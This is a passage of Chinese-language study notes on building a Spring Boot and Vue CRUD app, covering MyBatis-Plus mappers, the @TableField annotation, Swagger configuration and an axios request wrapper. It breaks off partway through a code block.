BaseMapper</strong></p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240117171229540.png\" alt=\"image-20240117171229540\" /></p>\n<p>框架里面有已经实现的 save 方法，重构之前的代码</p>\n<p>service</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240117172558522.png\" alt=\"image-20240117172558522\" /></p>\n<p>controller</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240117172611985.png\" alt=\"image-20240117172611985\" /></p>\n<p>mapper</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240117172635221.png\" alt=\"image-20240117172635221\" /></p>\n<p>重新访问接口，正常运行，此处需要<strong>解决附录问题 11（注解指定）</strong></p>\n<p>成功访问</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240117173425518.png\" alt=\"image-20240117173425518\" /></p>\n<p>数据库也修改</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240117173444772.png\" alt=\"image-20240117173444772\" /></p>\n<p>接下来，修改数据表增加头像字段</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240117174958479.png\" alt=\"image-20240117174958479\" /></p>\n<p>实体类中设置 avatarUrl 属性</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240117204332382.png\" alt=\"image-20240117204332382\" /></p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240117204402041.png\" alt=\"image-20240117204402041\" /></p>\n<p>数据库成功更新</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240117204428454.png\" alt=\"image-20240117204428454\" /></p>\n<p><strong>@TableField 注解</strong></p>\n<ol>\n<li>\n<p>数据库中字段为 last_name, 而实体类的属性为 lastName，前提是在全局策略配置中将驼峰命名关闭。</p>\n<figure class=\"highlight xml\"><figcaption data-lang=\"XML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>property</span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>dbColumnUnderline<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">value</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>false<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>property</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token annotation punctuation\">@TableField</span><span class=\"token punctuation\">(</span>value<span class=\"token operator\">=</span><span class=\"token string\">\"last_name\"</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure></li>\n<li>\n<p>实体类中有一个属性为 remark，但是在数据库中没有这个字段，但是在执行插入操作时给实体类的 remark 属性赋值了，那么可以通过在实体类的 remark 属性上添加注解</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token annotation punctuation\">@TableField</span><span class=\"token punctuation\">(</span>exist<span class=\"token operator\">=</span><span class=\"token boolean\">false</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure></li>\n</ol>\n<h2 id=\"swagger接口测试\"><a class=\"anchor\" href=\"#swagger接口测试\">#</a> Swagger 接口测试</h2>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzYwNTQxMTEwL2FydGljbGUvZGV0YWlscy8xMjg5MDI2Nzg=\">springboot3 使用 swagger 文档_springboot3 swagger-CSDN 博客</span></p>\n<p><strong>引入依赖</strong></p>\n<figure class=\"highlight xml\"><figcaption data-lang=\"XML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>dependency</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>groupId</span><span class=\"token punctuation\">></span></span>org.springframework.boot<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>groupId</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>artifactId</span><span class=\"token punctuation\">></span></span>spring-boot-starter-web<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>artifactId</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>version</span><span class=\"token punctuation\">></span></span>3.0.2<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>version</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>dependency</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>dependency</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>groupId</span><span class=\"token punctuation\">></span></span>org.springdoc<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>groupId</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>artifactId</span><span class=\"token punctuation\">></span></span>springdoc-openapi-starter-webmvc-ui<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>artifactId</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>version</span><span class=\"token punctuation\">></span></span>2.0.2<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>version</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>exclusions</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>exclusion</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>            <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>artifactId</span><span class=\"token punctuation\">></span></span>slf4j-api<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>artifactId</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>            <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>groupId</span><span class=\"token punctuation\">></span></span>org.slf4j<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>groupId</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>exclusion</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>exclusions</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>dependency</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><h3 id=\"swaggerconfigjava\"><a class=\"anchor\" href=\"#swaggerconfigjava\">#</a> SwaggerConfig.java</h3>\n<p>新建 src/main/java/com.xoxbc.springboot.<strong>config/SwaggerConfig</strong></p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">package</span> <span class=\"token namespace\">com<span class=\"token punctuation\">.</span>config</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre> </pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">io<span class=\"token punctuation\">.</span>swagger<span class=\"token punctuation\">.</span>v3<span class=\"token punctuation\">.</span>oas<span class=\"token punctuation\">.</span>models<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">ExternalDocumentation</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">io<span class=\"token punctuation\">.</span>swagger<span class=\"token punctuation\">.</span>v3<span class=\"token punctuation\">.</span>oas<span class=\"token punctuation\">.</span>models<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">OpenAPI</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">io<span class=\"token punctuation\">.</span>swagger<span class=\"token punctuation\">.</span>v3<span class=\"token punctuation\">.</span>oas<span class=\"token punctuation\">.</span>models<span class=\"token punctuation\">.</span>info<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Info</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">io<span class=\"token punctuation\">.</span>swagger<span class=\"token punctuation\">.</span>v3<span class=\"token punctuation\">.</span>oas<span class=\"token punctuation\">.</span>models<span class=\"token punctuation\">.</span>info<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">License</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">org<span class=\"token punctuation\">.</span>springframework<span class=\"token punctuation\">.</span>context<span class=\"token punctuation\">.</span>annotation<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Bean</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">org<span class=\"token punctuation\">.</span>springframework<span class=\"token punctuation\">.</span>context<span class=\"token punctuation\">.</span>annotation<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Configuration</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre> </pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token annotation punctuation\">@Configuration</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">SwaggerConfig</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre> </pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token annotation punctuation\">@Bean</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token class-name\">OpenAPI</span> <span class=\"token function\">springShopOpenAPI</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">OpenAPI</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>                <span class=\"token punctuation\">.</span><span class=\"token function\">info</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Info</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">title</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"标题\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>                        <span class=\"token punctuation\">.</span><span class=\"token function\">description</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"我的API文档\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>                        <span class=\"token punctuation\">.</span><span class=\"token function\">version</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"v1\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>                        <span class=\"token punctuation\">.</span><span class=\"token function\">license</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">License</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">name</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Apache 2.0\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">url</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"http://springdoc.org\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>                <span class=\"token punctuation\">.</span><span class=\"token function\">externalDocs</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">ExternalDocumentation</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>                        <span class=\"token punctuation\">.</span><span class=\"token function\">description</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"外部文档\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>                        <span class=\"token punctuation\">.</span><span class=\"token function\">url</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"https://springshop.wiki.github.org/docs\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre> </pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>新建测试接口 controller/TestController.java</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">package</span> <span class=\"token namespace\">com<span class=\"token punctuation\">.</span>controller</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre> </pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">io<span class=\"token punctuation\">.</span>swagger<span class=\"token punctuation\">.</span>v3<span class=\"token punctuation\">.</span>oas<span class=\"token punctuation\">.</span>annotations<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Operation</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">io<span class=\"token punctuation\">.</span>swagger<span class=\"token punctuation\">.</span>v3<span class=\"token punctuation\">.</span>oas<span class=\"token punctuation\">.</span>annotations<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Parameter</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">io<span class=\"token punctuation\">.</span>swagger<span class=\"token punctuation\">.</span>v3<span class=\"token punctuation\">.</span>oas<span class=\"token punctuation\">.</span>annotations<span class=\"token punctuation\">.</span>tags<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Tag</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">org<span class=\"token punctuation\">.</span>springframework<span class=\"token punctuation\">.</span>web<span class=\"token punctuation\">.</span>bind<span class=\"token punctuation\">.</span>annotation<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">GetMapping</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">org<span class=\"token punctuation\">.</span>springframework<span class=\"token punctuation\">.</span>web<span class=\"token punctuation\">.</span>bind<span class=\"token punctuation\">.</span>annotation<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">RestController</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre> </pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token annotation punctuation\">@RestController</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token annotation punctuation\">@Tag</span><span class=\"token punctuation\">(</span>name <span class=\"token operator\">=</span> <span class=\"token string\">\"测试Controller\"</span><span class=\"token punctuation\">,</span> description <span class=\"token operator\">=</span> <span class=\"token string\">\"这是描述\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">IndexController</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre> </pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token annotation punctuation\">@GetMapping</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/hello\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token annotation punctuation\">@Operation</span><span class=\"token punctuation\">(</span>summary <span class=\"token operator\">=</span> <span class=\"token string\">\"测试接口\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token class-name\">String</span> <span class=\"token function\">index</span><span class=\"token punctuation\">(</span><span class=\"token annotation punctuation\">@Parameter</span><span class=\"token punctuation\">(</span>name <span class=\"token operator\">=</span> <span class=\"token string\">\"name\"</span><span class=\"token punctuation\">,</span> description <span class=\"token operator\">=</span> <span class=\"token string\">\"名称\"</span><span class=\"token punctuation\">)</span> <span class=\"token class-name\">String</span> name<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token string\">\"hello \"</span> <span class=\"token operator\">+</span> name<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre> </pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>成功运行</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240118191701784.png\" alt=\"image-20240118191701784\" /></p>\n<h2 id=\"框架重构分页查询\"><a class=\"anchor\" href=\"#框架重构分页查询\">#</a> 框架重构分页查询</h2>\n<p>UserMapper 中的 sql 语句和方法都可以注释掉，否则就会相当于重写框架内的方法</p>\n<p>访问接口，成功查到</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240117233451821.png\" alt=\"image-20240117233451821\" /></p>\n<p>框架内调用<strong> QueryWrapper 类的 like 方法</strong>实现模糊查询</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240117233959965.png\" alt=\"image-20240117233959965\" /></p>\n<p>总</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240117235616546.png\" alt=\"image-20240117235616546\" /></p>\n<p>接口测试成功</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240117234346932.png\" alt=\"image-20240117234346932\" /></p>\n<h1 id=\"vue实现增删改查\"><a class=\"anchor\" href=\"#vue实现增删改查\">#</a> Vue 实现增删改查</h1>\n<h2 id=\"axios\"><a class=\"anchor\" href=\"#axios\">#</a> axios</h2>\n<p>之前使用的是 fetch API，比较麻烦</p>\n<p>axios 封装直接调用方便</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hxbm9kZS9hcnRpY2xlL2RldGFpbHMvMTE4MzI1ODY4\">https://blog.csdn.net/xqnode/article/details/118325868</span></p>\n<p><strong>安装 axios</strong></p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token builtin class-name\">cd</span> vue</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">npm</span> i axios <span class=\"token parameter variable\">-S</span></pre></td></tr></table></figure><p>新建<strong> src/utils/request.js</strong></p>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> axios <span class=\"token keyword\">from</span> <span class=\"token string\">'axios'</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">const</span> request <span class=\"token operator\">=</span> axios<span class=\"token punctuation\">.</span><span class=\"token function\">create</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token literal-property property\">baseURL</span><span class=\"token operator\">:</span> <span class=\"token string\">'/api'</span><span class=\"token punctuation\">,</span>  <span class=\"token comment\">// 注意！！ 这里是全局统一加上了 '/api' 前缀，也就是说所有接口都会加上 '/api' 前缀在，页面里面写接口的时候就不要加 '/api' 了，否则会出现 2 个 '/api'，类似 '/api/api/user' 这样的报错，切记！！！</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token literal-property property\">timeout</span><span class=\"token operator\">:</span> <span class=\"token number\">5000</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\">//request 拦截器</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\">// 可以自请求发送前对请求做一些处理</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\">// 比如统一加 token，对请求参数统一加密</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>request<span class=\"token punctuation\">.</span>interceptors<span class=\"token punctuation\">.</span>request<span class=\"token punctuation\">.</span><span class=\"token function\">use</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">config</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    config<span class=\"token punctuation\">.</span>headers<span class=\"token punctuation\">[</span><span class=\"token string\">'Content-Type'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string\">'application/json;charset=utf-8'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  </pre></td></tr><tr><td data-num=\"14\"></td><td><pre> <span class=\"token comment\">//config.headers ['token'] = user.token;  // 设置请求头</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">return</span> config</pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span> <span class=\"token parameter\">error</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">return</span> Promise<span class=\"token punctuation\">.</span><span class=\"token function\">reject</span><span class=\"token punctuation\">(</span>error<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token comment\">//response 拦截器</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token comment\">// 可以在接口响应后统一处理结果</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>request<span class=\"token punctuation\">.</span>interceptors<span class=\"token punctuation\">.</span>response<span class=\"token punctuation\">.</span><span class=\"token function\">use</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token parameter\">response</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token keyword\">let</span> res <span class=\"token operator\">=</span> response<span class=\"token punctuation\">.</span>data<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        <span class=\"token comment\">// 如果是返回的文件</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>response<span class=\"token punctuation\">.</span>config<span class=\"token punctuation\">.</span>responseType <span class=\"token operator\">===</span> <span class=\"token string\">'blob'</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>            <span class=\"token keyword\">return</span> res</pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        <span class=\"token comment\">// 兼容服务端返回的字符串数据</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">typeof</span> res <span class=\"token operator\">===</span> <span class=\"token string\">'string'</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>            res <span class=\"token operator\">=</span> res <span class=\"token operator\">?</span> <span class=\"token constant\">JSON</span><span class=\"token punctuation\">.</span><span class=\"token function\">parse</span><span class=\"token punctuation\">(</span>res<span class=\"token punctuation\">)</span> <span class=\"token operator\">:</span> res</pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        <span class=\"token keyword\">return</span> res<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    <span class=\"token parameter\">error</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>        console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">'err'</span> <span class=\"token operator\">+</span> error<span class=\"token punctuation\">)</span> <span class=\"token comment\">// for debug</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>        <span class=\"token keyword\">return</span> Promise<span class=\"token punctuation\">.</span><span class=\"token function\">reject</span><span class=\"token punctuation\">(</span>error<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre></pre></td></tr><tr><td data-num=\"41\"></td><td><pre></pre></td></tr><tr><td data-num=\"42\"></td><td><pre><span class=\"token keyword\">export</span> <span class=\"token keyword\">default</span> request</pre></td></tr></table></figure><p><strong>main.js 导入调用</strong></p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240118091529784.png\" alt=\"image-20240118091529784\" /></p>\n<p>废弃<strong> fetch 的请求方式（下面的方式）</strong>，改为 axios</p>\n<figure class=\"highlight js\"><figcaption data-lang=\"JavaScript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">load</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token 